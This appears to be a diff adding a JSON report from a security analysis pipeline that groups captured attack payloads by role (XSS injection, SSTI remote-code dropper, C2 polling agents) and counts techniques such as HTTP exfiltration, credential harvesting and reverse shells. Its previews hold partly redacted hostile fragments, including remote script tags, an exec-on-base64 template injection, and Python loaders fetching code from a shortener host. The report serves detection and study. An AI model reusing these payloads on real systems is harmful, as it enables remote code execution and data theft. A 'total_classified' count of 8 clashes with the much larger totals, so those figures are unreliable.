@@ -1,0 +1,155 @@
+{
+  "hubs": [
+    {
+      "id": "R0024455",
+      "children": 858,
+      "kind": "payload",
+      "role": "XSS/script injection",
+      "content_preview": "<body><img src=[REDACTED:destination:000003][SHORTENER URL 35284]><script src=[REDACTED:destination:000003][SHORTENER URL 35285]></script></body>\n\ndocument.body.innerText='FANPASS_12345 '+('X'.repeat(20));/*[ENCODED BLOB 17078]*/",
+      "child_kinds": {
+        "response": 429,
+        "recovered_text": 429
+      },
+      "tags": ""
+    },
+    {
+      "id": "R0036471",
+      "children": 270,
+      "kind": "payload",
+      "role": "SSTI/RCE dropper",
+      "content_preview": "import urllib.request as u,json,base64\nT='[CREDENTIAL 169]'\nf={'ref24.json': [ENCODED BLOB] cycler.__init__.__globals__.__builtins__.exec(cycler.__init__.__globals__.__builtins__.__import__(\\'base64\\').b64decode(\\'\\')) }}\",\"length\":\"1\",\"key\":\"slice.jsonl\",\"url\":\"data:[REDACTED:destination:002918]\"}]",
+      "child_kinds": {
+        "response": 134,
+        "recovered_text": 136
+      },
+      "tags": ""
+    },
+    {
+      "id": "R0080310",
+      "children": 134,
+      "kind": "payload",
+      "role": "XSS/script injection",
+      "content_preview": "[SERVICE 25 URL 175]\n\n\n<script src=[REDACTED:destination:000003][REDACTED:destination:009782]></script>\n\nfor(i=0;i<65;i=-~i)document.write(`<script [ENCODED BLOB]\nt='[ENCODED BLOB 55655]';\nt=t.concat('[ENCODED BLOB 55656]');\nt=t.concat('[ENCODED BLOB 55657]');\nt=t.concat('[ENCODED BLOB 55658]');\nt=t",
+      "child_kinds": {
+        "response": 67,
+        "recovered_text": 67
+      },
+      "tags": ""
+    },
+    {
+      "id": "R0036645",
+      "children": 108,
+      "kind": "payload",
+      "role": "C2 polling agent",
+      "content_preview": "import urllib.request as u,subprocess,os,time,tarfile,tempfile,json,base64,hashlib,socket,ssl,struct\nO=[]\ndef log(*x):O.append(' '.join(map(str,x)))\nkey=open('[REDACTED:source_path:001323]','w') if False else '[CREDENTIAL 1693]'\nd='/tmp/ts';os.makedirs(d,exist_ok=True)\nfor v in ['1.86.2','1.84.3','1",
+      "child_kinds": {
+        "response": 54,
+        "recovered_text": 54
+      },
+      "tags": ""
+    },
+    {
+      "id": "R0049534",
+      "children": 104,
+      "kind": "payload",
+      "role": "C2 polling agent",
+      "content_preview": "import urllib.request as u\nf=lambda s:b''.join(u.urlopen('[SHORTENER-3-HOST]'+x).read() for x in s.split(','))\na=f('22xzezad,2byuomns').decode();url=f(a.decode()).decode();r=u.urlopen(url);p=b'';n=0\nwhile 1:\n q=r.read(1048576)\n if not q:break\n s=p+q;i=0\n while 1:\n  i=s.find(b'23619',i)\n  if i<0:brea",
+      "child_kinds": {
+        "response": 52,
+        "recovered_text": 52
+      },
+      "tags": ""
+    },
+    {
+      "id": "R0050038",
+      "children": 90,
+      "kind": "payload",
+      "role": "C2 polling agent",
+      "content_preview": "import urllib.request as u,json\nf=lambda s:b''.join(u.urlopen('[SHORTENER-3-HOST]'+x).read() for x in s.split(','))\na=f('2c7gplbf,29x6alm7').decode();z=f(a).decode();r=u.urlopen(z)\nT=[b'json_tokener',b'tokener_parse_ex',b'utf8_replacement',b'json-c/json',b'printbuf_extend',b'got_hi_surrogate',b'json",
+      "child_kinds": {
+        "response": 45,
+        "recovered_text": 45
+      },
+      "tags": ""
+    },
+    {
+      "id": "R0017410",
+      "children": 84,
+      "kind": "payload",
+      "role": "C2 polling agent",
+      "content_preview": "import urllib.request as u,json,base64,gzip\nT='[CREDENTIAL 169]';r=b'---\\nconfigs:\\n- config_name: mark1342\\n  data_files: [{split: train, path: marker.h5}]\\n- config_name: map13420\\n  data_files: [{split: train, path: mapsfull.h5}]\\n- config_name: map13421\\n  data_files: [{split: train, path: mapsf",
+      "child_kinds": {
+        "response": 42,
+        "recovered_text": 42
+      },
+      "tags": ""
+    },
+    {
+      "id": "R0116826",
+      "children": 70,
+      "kind": "payload",
+      "role": "unknown",
+      "content_preview": "[SERVICE 25 URL 225][ENCODED BLOB 68457][REDACTED:opaque_marker_tail:000751][ENCODED BLOB 68458][REDACTED:opaque_marker_tail:000183][ENCODED BLOB 68459][REDACTED:opaque_marker_tail:000183][ENCODED BLOB 68460][REDACTED:opaque_marker_tail:000183][ENCODED BLOB 68461][REDACTED:opaque_marker_tail:000183]",
+      "child_kinds": {
+        "response": 35,
+        "recovered_text": 35
+      },
+      "tags": ""
+    },
+    {
+      "id": "R0116941",
+      "children": 70,
+      "kind": "payload",
+      "role": "unknown",
+      "content_preview": "[SERVICE 25 URL 225][ENCODED BLOB 68457][REDACTED:opaque_marker_tail:000751][ENCODED BLOB 68759][REDACTED:opaque_marker_tail:000183][ENCODED BLOB 68760][REDACTED:opaque_marker_tail:000183][ENCODED BLOB 68761][REDACTED:opaque_marker_tail:000183][ENCODED BLOB 68762][REDACTED:opaque_marker_tail:000183]",
+      "child_kinds": {
+        "response": 35,
+        "recovered_text": 35
+      },
+      "tags": ""
+    },
+    {
+      "id": "R0117064",
+      "children": 70,
+      "kind": "payload",
+      "role": "unknown",
+      "content_preview": "[SERVICE 25 URL 225][ENCODED BLOB 68457][REDACTED:opaque_marker_tail:000751][ENCODED BLOB 69104][REDACTED:opaque_marker_tail:000183][ENCODED BLOB 69105][REDACTED:opaque_marker_tail:000183][ENCODED BLOB 69106][REDACTED:opaque_marker_tail:000183][ENCODED BLOB 69107][REDACTED:opaque_marker_tail:000183]",
+      "child_kinds": {
+        "response": 35,
+        "recovered_text": 35
+      },
+      "tags": ""
+    }
+  ],
+  "taxonomy": {
+    "technique_counts": {
+      "xss_injection": 34573,
+      "http_exfil": 44951,
+      "credential_harvest": 36809,
+      "env_enumeration": 2562,
+      "base64_encoding": 31802,
+      "container_escape": 260,
+      "python_exec": 12966,
+      "image_beacon": 802,
+      "file_dropper": 513,
+      "dns_exfil": 30,
+      "reverse_shell": 93,
+      "supply_chain": 118,
+      "k8s_enum": 1551,
+      "ssti": 2925,
+      "tailscale": 733
+    },
+    "multi_technique_distribution": {
+      "4": 4765,
+      "3": 16894,
+      "2": 21692,
+      "0": 100429,
+      "1": 43076,
+      "5": 2018,
+      "6": 557,
+      "7": 130,
+      "8": 18
+    },
+    "total_classified": 8
+  }
+}
